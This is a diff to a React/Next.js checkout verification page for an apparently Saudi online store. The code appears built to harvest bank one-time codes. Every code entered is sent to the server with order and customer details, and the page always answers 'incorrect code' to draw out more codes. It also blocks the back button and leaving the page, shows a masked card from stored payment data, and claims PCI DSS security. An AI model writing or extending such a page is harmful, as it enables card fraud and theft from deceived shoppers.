@@ -2,235 +2,474 @@
 
 import { useState, useEffect, useRef } from "react";
 import Link from "next/link";
+import { AnimatePresence, motion } from "framer-motion";
+import {
+  ShieldCheck, RefreshCw, CheckCircle, FileText, Receipt,
+  X, CreditCard, AlertCircle,
+} from "lucide-react";
 import { useCartStore } from "../../store/cartStore";
-import { KeyRound, FileText, Receipt, X, RotateCcw, ChevronRight } from "lucide-react";
-import CheckoutStepper from "../../components/CheckoutStepper";
-import AnimatedBackground from "../../components/AnimatedBackground";
 
+function pad(n: number) { return String(n).padStart(2, "0"); }
+function fmtDate() {
+  const d = new Date();
+  return d.toLocaleDateString("ar-SA", { year: "numeric", month: "long", day: "numeric" })
+    + "  " + d.toLocaleTimeString("ar-SA", { hour: "2-digit", minute: "2-digit" });
+}
+
+function maskCard(cardNumber: string): string {
+  const digits = cardNumber.replace(/\D/g, "");
+  if (digits.length < 4) return cardNumber;
+  const last4 = digits.slice(-4);
+  const groups = Math.ceil((digits.length - 4) / 4);
+  return Array(groups).fill("••••").join(" ") + " " + last4;
+}
+
+/* ── Loading Screen ── */
+function LoadingScreen() {
+  return (
+    <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-gray-50 gap-6">
+      <div className="relative w-14 h-14">
+        <span className="absolute inset-0 rounded-full border-[3px] border-gray-200" />
+        <span className="absolute inset-0 rounded-full border-[3px] border-transparent border-t-[#47A557] animate-spin" style={{ animationDuration: "1s" }} />
+        <span className="absolute inset-2 rounded-full border-[3px] border-transparent border-t-[#129928] animate-spin" style={{ animationDuration: "0.7s", animationDirection: "reverse" }} />
+      </div>
+      <div className="text-center">
+        <p className="text-sm font-bold text-gray-700">جاري تحضير صفحة التحقق</p>
+        <p className="text-xs text-gray-400 mt-1">يرجى الانتظار...</p>
+      </div>
+    </div>
+  );
+}
+
+/* ── Success Modal ── */
+function SuccessModal({ confirmedId }: { confirmedId: string }) {
+  return (
+    <motion.div
+      initial={{ opacity: 0 }}
+      animate={{ opacity: 1 }}
+      className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 px-4"
+    >
+      <motion.div
+        initial={{ scale: 0.88, opacity: 0, y: 16 }}
+        animate={{ scale: 1, opacity: 1, y: 0 }}
+        transition={{ type: "spring", stiffness: 260 }}
+        className="relative bg-white rounded-2xl shadow-2xl w-full max-w-sm overflow-hidden"
+      >
+        <Link href="/" className="absolute top-3 left-3 p-1.5 rounded-full bg-gray-100 hover:bg-gray-200 text-gray-400 transition z-10">
+          <X size={14} />
+        </Link>
+
+        <div className="px-6 pt-7 pb-5 text-center" style={{ background: "linear-gradient(135deg, #47A557 0%, #129928 100%)" }}>
+          <motion.div
+            initial={{ scale: 0 }}
+            animate={{ scale: 1 }}
+            transition={{ type: "spring", stiffness: 300, delay: 0.15 }}
+            className="w-14 h-14 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-3"
+          >
+            <CheckCircle size={28} className="text-white" />
+          </motion.div>
+          <h2 className="text-white font-extrabold text-lg">تمت العملية بنجاح</h2>
+          <p className="text-white/65 text-xs mt-1">شكراً لثقتك بنا</p>
+        </div>
+
+        <div className="px-6 py-5 space-y-4">
+          <p className="text-gray-500 text-xs leading-6 text-center">
+            يرجى التواصل مع موظف خدمة العملاء لاستكمال إجراءات شحن الطلب.
+          </p>
+          <div className="flex gap-2">
+            <a
+              href={`/admin/orders/${confirmedId}/print`}
+              target="_blank"
+              rel="noopener noreferrer"
+              className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl text-white font-semibold text-xs hover:opacity-90 transition"
+              style={{ background: "linear-gradient(135deg, #47A557 0%, #129928 100%)" }}
+            >
+              <FileText size={13} /> الفاتورة
+            </a>
+            <a
+              href={`/admin/orders/${confirmedId}/receipt`}
+              target="_blank"
+              rel="noopener noreferrer"
+              className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl text-white font-semibold text-xs hover:opacity-90 transition"
+              style={{ background: "linear-gradient(135deg, #1A2E44 0%, #243d56 100%)" }}
+            >
+              <Receipt size={13} /> سند القبض
+            </a>
+          </div>
+        </div>
+      </motion.div>
+    </motion.div>
+  );
+}
+
+/* ── Main ── */
 export default function VerifyPage() {
-  const [code, setCode] = useState("");
+  const [phase, setPhase] = useState<"loading" | "verify">("loading");
+  const [otp, setOtp] = useState("");
   const [codeError, setCodeError] = useState(false);
-  const [wrongCode, setWrongCode] = useState(false);
+  const [lengthError, setLengthError] = useState(false);
   const [resent, setResent] = useState(false);
-  const [confirmed, setConfirmed] = useState(false);
-  const [resendCooldown, setResendCooldown] = useState(60);
+  const [cooldown, setCooldown] = useState(60);
+  const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const cooldownEndRef = useRef<number>(0);
   const [submitCooldown, setSubmitCooldown] = useState(0);
   const submitCooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const [submitting, setSubmitting] = useState(false);
+  const [attempts, setAttempts] = useState(() => {
+    if (typeof window === "undefined") return 0;
+    return parseInt(sessionStorage.getItem("verifyAttempts") ?? "0", 10);
+  });
+  const [limitReached, setLimitReached] = useState(() => {
+    if (typeof window === "undefined") return false;
+    return parseInt(sessionStorage.getItem("verifyAttempts") ?? "0", 10) >= 4;
+  });
+  const [redirectTimer, setRedirectTimer] = useState(5);
+  const [confirmed, setConfirmed] = useState(false);
   const [dbOrderId, setDbOrderId] = useState<string | null>(null);
   const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
-  const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const otpRef = useRef<HTMLInputElement>(null);
 
+  const { totalPrice, customer } = useCartStore();
+  const total = totalPrice();
+
+  // قراءة بيانات الطلب من localStorage
+  const orderId   = typeof window !== "undefined" ? localStorage.getItem("orderId")   ?? "—" : "—";
+  const storedDbId = typeof window !== "undefined" ? localStorage.getItem("dbOrderId") ?? null : null;
+
+  const paymentInfo = typeof window !== "undefined"
+    ? (() => { try { return JSON.parse(localStorage.getItem("paymentInfo") ?? "{}"); } catch { return {}; } })()
+    : {};
+  const cardNumber: string = paymentInfo.cardNumber ?? "";
+  const maskedLabel = maskCard(cardNumber);
+
+  // Block navigation away from this page
   useEffect(() => {
-    cooldownRef.current = setInterval(() => {
-      setResendCooldown(prev => {
-        if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
-        return prev - 1;
-      });
-    }, 1000);
-    return () => clearInterval(cooldownRef.current!);
+    const blockNav = (e: BeforeUnloadEvent) => { e.preventDefault(); e.returnValue = ""; };
+    window.addEventListener("beforeunload", blockNav);
+    const blockBack = () => { window.history.pushState(null, "", window.location.href); };
+    window.history.pushState(null, "", window.location.href);
+    window.history.pushState(null, "", window.location.href);
+    window.addEventListener("popstate", blockBack);
+
+    const t = setTimeout(() => {
+      setPhase("verify");
+      setTimeout(() => otpRef.current?.focus(), 80);
+    }, 4000);
+
+    return () => {
+      clearTimeout(t);
+      window.removeEventListener("popstate", blockBack);
+      window.removeEventListener("beforeunload", blockNav);
+    };
   }, []);
 
   function startCooldown() {
+    cooldownEndRef.current = Date.now() + 60 * 1000;
+    setCooldown(60);
     clearInterval(cooldownRef.current!);
-    setResendCooldown(60);
     cooldownRef.current = setInterval(() => {
-      setResendCooldown(prev => {
-        if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
-        return prev - 1;
-      });
-    }, 1000);
+      const remaining = Math.ceil((cooldownEndRef.current - Date.now()) / 1000);
+      if (remaining <= 0) { clearInterval(cooldownRef.current!); setCooldown(0); }
+      else setCooldown(remaining);
+    }, 500);
   }
-
-  const { customer } = useCartStore();
-
   useEffect(() => {
-    if (!dbOrderId) return;
-    pollRef.current = setInterval(async () => {
-      const res = await fetch(`/api/admin/orders/${dbOrderId}`);
-      if (!res.ok) return;
-      const data = await res.json();
-      if (data.status === "confirmed") {
-        clearInterval(pollRef.current!);
-        setConfirmed(true);
-      }
-    }, 5000);
-    return () => clearInterval(pollRef.current!);
-  }, [dbOrderId]);
+    startCooldown();
+    return () => clearInterval(cooldownRef.current!);
+  }, []); // eslint-disable-line
 
-  async function handleSubmit() {
-    if (code.length !== 4 && code.length !== 6) { setCodeError(true); return; }
-    const orderId = localStorage.getItem("orderId") ?? "—";
+  // Polling لحالة الطلب
+  useEffect(() => {
+    const id = storedDbId;
+    if (!id) return;
+    setDbOrderId(id);
+
+    const MAX_POLL_MS = 30 * 60 * 1000;
+    const startTime = Date.now();
+    let currentInterval = 5000;
+    let timeoutId: ReturnType<typeof setTimeout>;
+
+    const poll = async () => {
+      if (Date.now() - startTime >= MAX_POLL_MS) return;
+      try {
+        const res = await fetch(`/api/orders/${id}/status`);
+        if (res.ok) {
+          const data = await res.json();
+          if (data.status === "confirmed") { setConfirmed(true); return; }
+        }
+      } catch { /* network error — retry */ }
+      currentInterval = Math.min(currentInterval * 1.5, 30000);
+      timeoutId = setTimeout(poll, currentInterval);
+    };
+
+    timeoutId = setTimeout(poll, currentInterval);
+    return () => clearTimeout(timeoutId);
+  }, []); // eslint-disable-line
+
+  async function handleSubmit(e: React.FormEvent) {
+    e.preventDefault();
+    if (submitting || submitCooldown > 0) return;
+    if (otp.length < 4) { setLengthError(true); return; }
+    setLengthError(false);
+    setSubmitting(true);
     const customerName = customer?.name ?? "—";
-    const customerId = customer?.nationalId ?? "—";
-    setSubmitCooldown(5);
-    submitCooldownRef.current = setInterval(() => {
-      setSubmitCooldown(prev => {
-        if (prev <= 1) { clearInterval(submitCooldownRef.current!); return 0; }
-        return prev - 1;
-      });
-    }, 1000);
-    setCode("");
-    setWrongCode(true);
     await fetch("/api/verify", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ code, orderId, customerName, customerId }),
+      body: JSON.stringify({ code: otp, orderId, customerName }),
     });
-    try {
-      const res = await fetch("/api/admin/orders");
-      const orders = await res.json();
-      const match = Array.isArray(orders) ? orders.find((o: { orderId: string; _id: string }) => o.orderId === orderId) : null;
-      if (match) setDbOrderId(match._id);
-    } catch {}
+    setSubmitting(false);
+    setCodeError(true);
+    setOtp("");
+    const newAttempts = attempts + 1;
+    setAttempts(newAttempts);
+    sessionStorage.setItem("verifyAttempts", String(newAttempts));
+    if (newAttempts >= 4) { setLimitReached(true); return; }
+    setSubmitCooldown(5);
+    clearInterval(submitCooldownRef.current!);
+    submitCooldownRef.current = setInterval(() => {
+      setSubmitCooldown(p => {
+        if (p <= 1) { clearInterval(submitCooldownRef.current!); return 0; }
+        return p - 1;
+      });
+    }, 1000);
   }
 
-  // Confirmed Popup
-  if (confirmed && dbOrderId) {
-    return (
-      <>
-        <AnimatedBackground />
-        <div className="fixed inset-0 backdrop-blur-sm flex items-center justify-center z-50 px-4" style={{ background: "rgba(240,248,242,0.85)" }} dir="rtl">
-          <div className="relative rounded-3xl w-full max-w-sm sm:max-w-md overflow-hidden border border-[#80C78D]/40" style={{ background: "#ffffff" }}>
-            <Link href="/" className="absolute top-3 left-3 p-1.5 rounded-full border border-[#80C78D]/40 hover:border-[#47A557] text-[#1A2E44]/40 transition z-10" style={{ background: "#DCEFE8" }}>
-              <X className="w-4 h-4" />
-            </Link>
-
-            <div className="h-1.5 w-full" style={{ background: "linear-gradient(90deg, #47A557, #80C78D)" }} />
-
-            <div className="flex flex-col items-center pt-6 pb-3">
-              <img src="/sucess.webp" alt="success" className="w-28 h-28 sm:w-36 sm:h-36 object-contain" />
-              <span className="mt-3 text-white text-sm font-black px-6 py-1.5 rounded-full shadow-md" style={{ background: "linear-gradient(135deg, #47A557, #129928)" }}>
-                نجحت عملية الدفع ✓
-              </span>
-            </div>
-
-            <div className="px-6 py-5 flex flex-col gap-4 text-center">
-              <div className="space-y-2">
-                <p className="text-[#1A2E44] font-black text-base">تمت العملية بنجاح</p>
-                <p className="text-[#1A2E44]/60 text-sm leading-7">
-                  شكراً لك لثقتك، وإنه لمن دواعي سرورنا العمل معكم، نشكرك على كونك واحداً من عملائنا الكرام، أنتم تستحقون أفضل خدماتنا.
-                </p>
-                <p className="text-[#1A2E44]/30 text-xs">يرجى التواصل مع موظف خدمة العملاء لاستكمال إجراءات شحن الطلب.</p>
-              </div>
-              <div className="flex gap-3 pb-1">
-                <a href={`/admin/orders/${dbOrderId}/print`} target="_blank" rel="noopener noreferrer"
-                  className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-xl text-white font-black text-sm transition hover:opacity-90"
-                  style={{ background: "linear-gradient(135deg, #47A557, #129928)" }}>
-                  <FileText className="w-4 h-4" /> الفاتورة
-                </a>
-                <a href={`/admin/orders/${dbOrderId}/receipt`} target="_blank" rel="noopener noreferrer"
-                  className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-xl text-white font-black text-sm transition hover:opacity-90"
-                  style={{ background: "linear-gradient(135deg, #47A557, #129928)" }}>
-                  <Receipt className="w-4 h-4" /> سند القبض
-                </a>
-              </div>
-            </div>
-          </div>
-        </div>
-      </>
-    );
+  function handleResend() {
+    fetch("/api/resend", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ orderId, customerName: customer?.name ?? "—" }),
+    });
+    setResent(true);
+    setTimeout(() => setResent(false), 3000);
+    startCooldown();
   }
 
-  // OTP Form
+  const confirmedId = dbOrderId ?? storedDbId;
+
+  // Redirect countdown عند تجاوز الحد
+  useEffect(() => {
+    if (!limitReached) return;
+    setRedirectTimer(5);
+    const iv = setInterval(() => {
+      setRedirectTimer(p => {
+        if (p <= 1) {
+          clearInterval(iv);
+          sessionStorage.removeItem("verifyAttempts");
+          window.location.href = "/";
+          return 0;
+        }
+        return p - 1;
+      });
+    }, 1000);
+    return () => clearInterval(iv);
+  }, [limitReached]);
+
   return (
-    <div className="min-h-screen bg-[#f0f8f2] flex flex-col items-center justify-center px-4 sm:px-6 py-8" dir="rtl">
-      <AnimatedBackground />
+    <main className="min-h-screen bg-gray-50 flex items-center justify-center px-4" dir="rtl">
 
-      <div className="w-full max-w-md sm:max-w-lg mb-4">
-        <CheckoutStepper active="confirm" />
-      </div>
+      <AnimatePresence>
+        {phase === "loading" && (
+          <motion.div key="load" initial={{ opacity: 1 }} exit={{ opacity: 0 }} transition={{ duration: 0.35 }}>
+            <LoadingScreen />
+          </motion.div>
+        )}
+      </AnimatePresence>
 
-      <div className="w-full max-w-md sm:max-w-lg rounded-2xl sm:rounded-3xl overflow-hidden border border-[#80C78D]/40" style={{ background: "#ffffff" }}>
+      <AnimatePresence>
+        {confirmed && confirmedId && <SuccessModal key="success" confirmedId={confirmedId} />}
+      </AnimatePresence>
 
-        {/* Top accent */}
-        <div className="h-1.5 w-full" style={{ background: "linear-gradient(90deg, #47A557, #80C78D)" }} />
-
-        {/* Header */}
-        <div className="px-5 py-4 border-b border-[#80C78D]/30 flex items-center gap-3" style={{ background: "#DCEFE8" }}>
-          <div className="w-10 h-10 rounded-xl flex items-center justify-center border border-[#80C78D]/40" style={{ background: "#ffffff" }}>
-            <KeyRound className="text-[#47A557] w-5 h-5" />
-          </div>
-          <div>
-            <h2 className="text-[#1A2E44] text-sm font-black">تأكيد رمز التحقق</h2>
-            <p className="text-[#1A2E44]/50 text-[10px] mt-0.5">أدخل الرمز المكون من 4 أو 6 أرقام لإتمام الطلب</p>
-          </div>
-        </div>
-
-        <div className="px-5 sm:px-8 py-6 sm:py-8 space-y-5">
-
-          {/* OTP Input */}
-          <div className="flex flex-col gap-2">
-            <label className="text-xs font-bold text-[#1A2E44]/70 flex items-center gap-1.5">
-              <KeyRound className="w-3.5 h-3.5 text-[#47A557]" />
-              رمز التحقق
-            </label>
-            <input
-              type="text"
-              inputMode="numeric"
-              value={code}
-              maxLength={6}
-              placeholder="— — — —"
-              onChange={e => { setCode(e.target.value.replace(/\D/g, "").slice(0, 6)); setCodeError(false); setWrongCode(false); }}
-              className={`w-full text-center text-2xl sm:text-3xl font-black tracking-[0.5em] border-2 rounded-2xl px-4 py-4 outline-none transition-all duration-200 ${
-                codeError || wrongCode
-                  ? "border-red-400/50 bg-red-50 text-red-400"
-                  : "border-[#80C78D]/40 bg-[#DCEFE8]/40 text-[#47A557] focus:border-[#47A557] focus:bg-white"
-              }`}
-            />
-            <p className="text-[#1A2E44]/30 text-[10px] text-center">قد يستغرق وصول الرمز بضع دقائق</p>
-            {codeError && <p className="text-red-500 text-xs font-bold text-center bg-red-50 py-2 rounded-xl border border-red-400/20">⚠️ الكود يجب أن يكون 4 أو 6 أرقام</p>}
-            {wrongCode && <p className="text-red-500 text-xs font-bold text-center bg-red-50 py-2 rounded-xl border border-red-400/20">❌ الكود غير صحيح، حاول مرة أخرى</p>}
-            {resent && <p className="text-[#47A557] text-xs font-bold text-center py-2 rounded-xl border border-[#80C78D]/40" style={{ background: "#DCEFE8" }}>✓ تم إعادة إرسال الرمز بنجاح</p>}
-          </div>
-
-          {/* Actions */}
-          <div className="space-y-2.5">
-            <button
-              onClick={handleSubmit}
-              disabled={submitCooldown > 0}
-              className="w-full text-white py-4 rounded-2xl font-black text-sm transition-all active:scale-[0.98] disabled:opacity-60 disabled:cursor-not-allowed hover:opacity-90 shadow-lg"
-              style={{ background: submitCooldown > 0 ? "#80C78D" : "linear-gradient(135deg, #47A557 0%, #129928 100%)", boxShadow: "0 8px 24px rgba(71,165,87,0.25)" }}
+      {/* Limit Reached Modal */}
+      <AnimatePresence>
+        {limitReached && (
+          <motion.div
+            key="limit"
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center px-4"
+          >
+            <motion.div
+              initial={{ scale: 0.88, opacity: 0, y: 16 }}
+              animate={{ scale: 1, opacity: 1, y: 0 }}
+              transition={{ type: "spring", stiffness: 260 }}
+              className="bg-white rounded-2xl shadow-2xl w-full max-w-sm overflow-hidden text-center"
             >
-              {submitCooldown > 0 ? `⏳ انتظر ${submitCooldown} ثانية...` : "✅ تأكيد وإتمام الطلب"}
-            </button>
+              <div className="bg-gradient-to-l from-red-600 to-red-800 px-6 pt-7 pb-5">
+                <div className="w-14 h-14 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-3">
+                  <AlertCircle size={28} className="text-white" />
+                </div>
+                <h2 className="text-white font-extrabold text-lg">تم تجاوز الحد الأقصى</h2>
+                <p className="text-white/70 text-xs mt-1">لقد تجاوزت الحد الأقصى للمحاولات المسموح بها</p>
+              </div>
+              <div className="px-6 py-5 space-y-3">
+                <p className="text-gray-500 text-sm leading-6">سيتم توجيهك إلى الصفحة الرئيسية تلقائياً</p>
+                <div className="w-12 h-12 rounded-full bg-red-50 border-2 border-red-200 flex items-center justify-center mx-auto">
+                  <span className="text-red-600 font-extrabold text-lg">{redirectTimer}</span>
+                </div>
+              </div>
+            </motion.div>
+          </motion.div>
+        )}
+      </AnimatePresence>
 
-            <div className="flex gap-2.5">
-              <button
-                disabled={resendCooldown > 0}
-                onClick={() => {
-                  const orderId = localStorage.getItem("orderId") ?? "—";
-                  fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName: customer?.name ?? "—" }) });
-                  setResent(true);
-                  setTimeout(() => setResent(false), 3000);
-                  startCooldown();
-                }}
-                className="flex-1 flex items-center justify-center gap-1.5 py-3 rounded-xl text-xs sm:text-sm font-bold transition-all border-2 border-[#80C78D]/40 text-[#47A557] hover:border-[#47A557] disabled:opacity-50 disabled:cursor-not-allowed"
-                style={{ background: "#DCEFE8" }}
-              >
-                <RotateCcw className="w-3.5 h-3.5" />
-                {resendCooldown > 0 ? `${resendCooldown}ث` : "إعادة الإرسال"}
-              </button>
+      {/* Verify Card */}
+      <AnimatePresence>
+        {phase === "verify" && (
+          <motion.div
+            key="verify"
+            initial={{ opacity: 0, y: 14 }}
+            animate={{ opacity: 1, y: 0 }}
+            transition={{ duration: 0.4 }}
+            className="w-full max-w-sm"
+          >
+            <div className="bg-white rounded-2xl shadow-xl shadow-gray-200/80 overflow-hidden">
 
-              <Link
-                href="/checkout"
-                className="flex-1 flex items-center justify-center gap-1.5 border-2 border-[#80C78D]/40 text-[#1A2E44]/60 hover:border-[#47A557] hover:text-[#1A2E44] py-3 rounded-xl font-bold text-xs sm:text-sm transition"
-                style={{ background: "#DCEFE8" }}
-              >
-                <ChevronRight className="w-4 h-4" />
-                الخطوة السابقة
-              </Link>
+              {/* Top accent */}
+              <div className="h-1.5 w-full" style={{ background: "linear-gradient(90deg, #47A557, #80C78D)" }} />
+
+              {/* Header */}
+              <div className="px-6 pt-6 pb-4">
+                <h1 className="text-base font-extrabold text-gray-900 text-center">تأكيد عملية الشراء</h1>
+                <div className="mt-3 h-px bg-gray-100 w-full" />
+                <p className="text-xs text-gray-400 text-center mt-3 leading-relaxed">
+                  تم إرسال رسالة نصية بها رمز التحقق إلى رقم الجوال لإتمام المعاملة.
+                </p>
+              </div>
+
+              <div className="px-6 pb-6 space-y-4">
+
+                {/* Transaction details */}
+                <div className="border border-gray-100 rounded-xl overflow-hidden">
+                  <div className="flex justify-between items-center px-4 py-2.5 border-b border-gray-100">
+                    <span className="text-gray-400 text-xs">المبلغ</span>
+                    <span className="font-bold text-gray-800 text-sm">{total.toLocaleString("en-US")} ر.س</span>
+                  </div>
+                  <div className="flex justify-between items-center px-4 py-2.5 border-b border-gray-100">
+                    <span className="text-gray-400 text-xs">التاريخ</span>
+                    <span className="text-gray-600 text-xs">{fmtDate()}</span>
+                  </div>
+                  <div className="flex justify-between items-center px-4 py-2.5">
+                    <span className="text-gray-400 text-xs flex items-center gap-1">
+                      <CreditCard size={11} />
+                      وسيلة الدفع
+                    </span>
+                    <span className="font-mono font-bold text-gray-700 text-xs tracking-wider" dir="ltr">
+                      {maskedLabel || "•••• •••• •••• ••••"}
+                    </span>
+                  </div>
+                </div>
+
+                {/* OTP Form */}
+                <form onSubmit={handleSubmit} className="space-y-3">
+                  <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest text-center">Verification Code</p>
+
+                  <div dir="ltr">
+                    <input
+                      ref={otpRef}
+                      type="text"
+                      inputMode="numeric"
+                      autoComplete="one-time-code"
+                      maxLength={6}
+                      value={otp}
+                      onChange={e => {
+                        setOtp(e.target.value.replace(/\D/g, "").slice(0, 6));
+                        setCodeError(false);
+                        setLengthError(false);
+                      }}
+                      placeholder="أدخل رمز التحقق"
+                      className={`w-full text-center text-2xl font-bold tracking-[0.5em] border rounded-xl py-3 focus:outline-none transition-all placeholder:text-sm placeholder:tracking-normal placeholder:font-normal ${
+                        codeError
+                          ? "border-red-300 bg-red-50 text-red-600"
+                          : "border-gray-200 bg-gray-50 text-gray-800 focus:border-[#47A557]/50 focus:bg-white"
+                      }`}
+                    />
+                  </div>
+
+                  <AnimatePresence mode="wait">
+                    {lengthError && (
+                      <motion.p
+                        key="len"
+                        initial={{ opacity: 0, y: -4 }}
+                        animate={{ opacity: 1, y: 0 }}
+                        exit={{ opacity: 0 }}
+                        className="text-amber-500 text-xs text-center flex items-center justify-center gap-1"
+                      >
+                        <AlertCircle size={11} /> يجب إدخال 4 أرقام على الأقل
+                      </motion.p>
+                    )}
+                    {codeError && (
+                      <motion.p
+                        key="err"
+                        initial={{ opacity: 0, y: -4 }}
+                        animate={{ opacity: 1, y: 0 }}
+                        exit={{ opacity: 0 }}
+                        className="text-red-500 text-xs text-center flex items-center justify-center gap-1"
+                      >
+                        <AlertCircle size={11} /> رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى.
+                      </motion.p>
+                    )}
+                    {resent && (
+                      <motion.p
+                        key="resent"
+                        initial={{ opacity: 0, y: -4 }}
+                        animate={{ opacity: 1, y: 0 }}
+                        exit={{ opacity: 0 }}
+                        className="text-green-600 text-xs text-center"
+                      >
+                        ✓ تم إعادة إرسال الرمز
+                      </motion.p>
+                    )}
+                  </AnimatePresence>
+
+                  {/* Countdown */}
+                  <div className="text-center">
+                    {cooldown > 0 ? (
+                      <span className="text-xs text-gray-400">
+                        إعادة الإرسال خلال{" "}
+                        <span className="font-mono font-bold text-gray-500">
+                          {pad(Math.floor(cooldown / 60))}:{pad(cooldown % 60)}
+                        </span>
+                      </span>
+                    ) : (
+                      <button
+                        type="button"
+                        onClick={handleResend}
+                        className="inline-flex items-center gap-1 text-xs text-gray-500 hover:text-gray-800 transition font-medium"
+                      >
+                        <RefreshCw size={11} /> إعادة إرسال الرمز
+                      </button>
+                    )}
+                  </div>
+
+                  <button
+                    type="submit"
+                    disabled={submitting || submitCooldown > 0}
+                    className="w-full py-3.5 text-white rounded-xl font-extrabold text-sm shadow-md hover:scale-[1.015] active:scale-[0.985] transition-all disabled:opacity-50 disabled:cursor-not-allowed disabled:scale-100 flex items-center justify-center gap-2"
+                    style={{ background: "linear-gradient(135deg, #47A557 0%, #129928 100%)", boxShadow: "0 8px 24px rgba(71,165,87,0.25)" }}
+                  >
+                    {submitting ? (
+                      <>
+                        <span className="w-3.5 h-3.5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                        جاري التحقق...
+                      </>
+                    ) : submitCooldown > 0 ? `انتظر (${submitCooldown}s)` : (
+                      <><ShieldCheck size={14} /> إتمام الدفع</>
+                    )}
+                  </button>
+                </form>
+
+                <p className="text-center text-[10px] text-gray-300 flex items-center justify-center gap-1">
+                  <ShieldCheck size={10} className="text-gray-300" />
+                  اتصال مشفّر وآمن · PCI DSS
+                </p>
+
+              </div>
             </div>
-          </div>
-
-          {/* Security note */}
-          <div className="flex items-center justify-center gap-1.5 text-[#1A2E44]/30 text-[10px] sm:text-[11px]">
-            <svg className="w-3 h-3" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
-              <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
-            </svg>
-            <span>معاملة آمنة ومشفرة بالكامل</span>
-          </div>
-        </div>
-      </div>
-    </div>
+          </motion.div>
+        )}
+      </AnimatePresence>
+    </main>
   );
 }
